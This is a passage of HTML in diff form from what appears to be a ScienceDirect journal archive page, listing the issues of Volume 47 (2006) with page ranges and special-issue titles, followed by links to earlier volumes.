+            <td nowrap class="txt" style="border-bottom: 1px solid #999999; padding-top: 3px;" colspan="3">
+              <img src="/scidirimg/sci_dir/jrn_sub.gif" height="14" witdh="12" border=0 alt="Subscribed" title="Subscribed"> = subscribed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/scidirimg/jrn_freesub.gif" height="14" witdh="12" border=0 alt="Free" title="Free"> = free<br><img src="/scidirimg/jrn_nsub.gif" height="14" witdh="12" border=0 alt="Non-subscribed" title="Non-subscribed"> = non-subscribed
+            </td>
+          </tr>
+        </table>
+      
+    
+    <table class=pubBody cellspacing="0" cellpadding="2" width="100%" style="border: 2px solid #666666;border-top: 0px;">
+      <TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_ctockey=%23toc%235601%232006%23999529978%23633712%23FLA%23&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e68d5587a53e951d3a2abd54416a5256&jchunk=xxx"><img src="/scidirimg/minus.gif" alt="Close" title="Close" width="9" height="9" border="0"></A><A name="47"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_ctockey=%23toc%235601%232006%23999529978%23633712%23FLA%23&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e68d5587a53e951d3a2abd54416a5256&jchunk=xxx">Volume 47 (2006)</A></B></TD></TR><tr bgcolor="#dddddd"><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img0','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img0','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img0" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><span style="color: blue; font-weight: bold">Volume 47, Issue 21</A></span><br>pp. 7329-7610 (4 October 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img1','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img1','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img1" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529979%23633186%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=2970fd9fa62caa25b82154d882dc40f7">Volume 47, Issue 20</A></A><br>pp. 6925-7328 (20 September 2006)<br><small>Structure and Dynamics of Complex Polymeric Materials. Commemorating Tadeusz Pakula</small></TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img2','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img2','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img2" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529980%23631084%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=35feb31b13eed699078813ebaede9f65">Volume 47, Issue 19</A><br>pp. 6481-6924 (7 September 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img3','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img3','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img3" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529981%23629948%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=53199423cd3d5d193fe5490b8aded391">Volume 47, Issue 18</A><br>pp. 6257-6480 (23 August 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img4','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img4','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img4" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529982%23628796%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=8e19f6d7dcfc25ccc7b11c815ff089dd">Volume 47, Issue 17</A><br>pp. 6011-6256 (9 August 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img5','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img5','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img5" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529983%23628026%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=19221d3f92953baf4bcbbf8c7e489930">Volume 47, Issue 16</A><br>pp. 5701-6010 (26 July 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img6','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img6','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img6" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529984%23627943%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=e4047a5d5cbc9c6c45ac9e0baf11c20a">Volume 47, Issue 15</A></A><br>pp. 5221-5700 (12 July 2006)<br><small>Morphology of Crystalline Polymers: Dedicated to David Bassett on the Occasion of his Retirement</small></TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img7','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img7','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img7" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529985%23626760%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=54b826617ac0e23bcd3b0164570070f6">Volume 47, Issue 14</A><br>pp. 4867-5220 (28 June 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img8','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img8','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img8" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529986%23625402%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=db3c0f37340afcf83699e1d8cf08148e">Volume 47, Issue 13</A>, Page 4461-4866 (14 June 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img9','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img9','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img9" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529987%23623777%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=224d5bcf83432b0402c3644e3df8f4b8">Volume 47, Issue 12</A><br>pp. 4245-4460 (31 May 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img10','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img10','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img10" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529988%23623776%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=d98f4eeb6595e49eddb6e604469eb1bc">Volume 47, Issue 11</A></A><br>pp. 3705-4244 (17 May 2006)<br><small>Special issue in honour of James McGrath</small></TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img11','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img11','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img11" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529989%23622127%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=1180f144f97b2b69456c3082f137dff9">Volume 47, Issue 10</A><br>pp. 3271-3704 (3 May 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img12','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img12','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img12" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529990%23622311%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=4c1aa762867081b1a7a6b7dab7b5d8bc">Volume 47, Issue 9</A><br>pp. 2935-3270 (19 April 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img13','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img13','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img13" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529991%23620294%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=ed342049ed3e7325efc171700d0d66c3">Volume 47, Issue 8</A><br>pp. 2581-2934 (5 April 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img14','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img14','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img14" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529992%23618992%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=9c34d36f27a22a1b8c1483282511b1cc">Volume 47, Issue 7</A></A><br>pp. 2217-2580 (22 March 2006)<br><small>Single Chain Polymers</small></TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img15','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img15','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img15" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529993%23618412%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=71a86830bb0abfaba88ff633f6464cf3">Volume 47, Issue 6</A><br>pp. 1763-2216 (8 March 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img16','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img16','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img16" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529994%23616982%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=4b873a0647ff9c3826f06ea32e4a5b9a">Volume 47, Issue 5</A><br>pp. 1487-1762 (22 February 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img17','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img17','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img17" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529995%23616294%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=88df65b14b694bbeffe5bdd7d790e1bd">Volume 47, Issue 4</A><br>pp. 947-1486 (8 February 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img18','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img18','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img18" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529996%23615118%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=2a83307849400d4ca56673948225fc2d">Volume 47, Issue 3</A><br>pp. 775-946 (25 January 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img19','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img19','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img19" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529997%23614658%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=34cf823aeef4d844f8ec6cf4f3e92b17">Volume 47, Issue 2</A><br>pp. 501-774 (13 January 2006)</TD></TR><tr><td>&nbsp;</td><TD width="16" valign=top><a href="/science/subscriptionSummary/5601/J" onmouseover="roll('img20','/scidirimg/sci_dir/jrn_sub_on.gif')" onmouseout="roll('img20','/scidirimg/sci_dir/jrn_sub.gif')" onClick="openWindow('/science/subscriptionSummary/5601/J','580','440'); return false;"><img border=0 name="img20" src="/scidirimg/sci_dir/jrn_sub.gif" width=12 height=14 alt="Subscribed - Click this icon for more details" title="Subscribed - Click this icon for more details"></td><td class="txt"><A HREF="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529998%23613998%23FLA%23&_cdi=5601&_pubType=J&view=c&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=3016b308d4443178b37951067f837028">Volume 47, Issue 1</A><br>pp. 1-500 (3 January 2006)</TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=46#46"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=46#46">Volume 46 (2005)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=45#45"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=45#45">Volume 45 (2004)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=44#44"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=44#44">Volume 44 (2003)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=43#43"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=43#43">Volume 43 (2002)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=42#42"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=42#42">Volume 42 (2001)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=41#41"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=41#41">Volume 41 (2000)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=40#40"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=40#40">Volume 40 (1999)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=39#39"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=39#39">Volume 39 (1998)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=38#38"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=38#38">Volume 38 (1997)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=37#37"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=37#37">Volume 37 (1996)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=36#36"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=36#36">Volume 36 (1995)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=35#35"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=35#35">Volume 35 (1994)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=34#34"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=34#34">Volume 34 (1993)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=33#33"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=33#33">Volume 33 (1992)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=32#32"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=32#32">Volume 32 (1991)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=31#31"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=31#31">Volume 31 (1990)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=30#30"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=30#30">Volume 30 (1989)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=29#29"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td 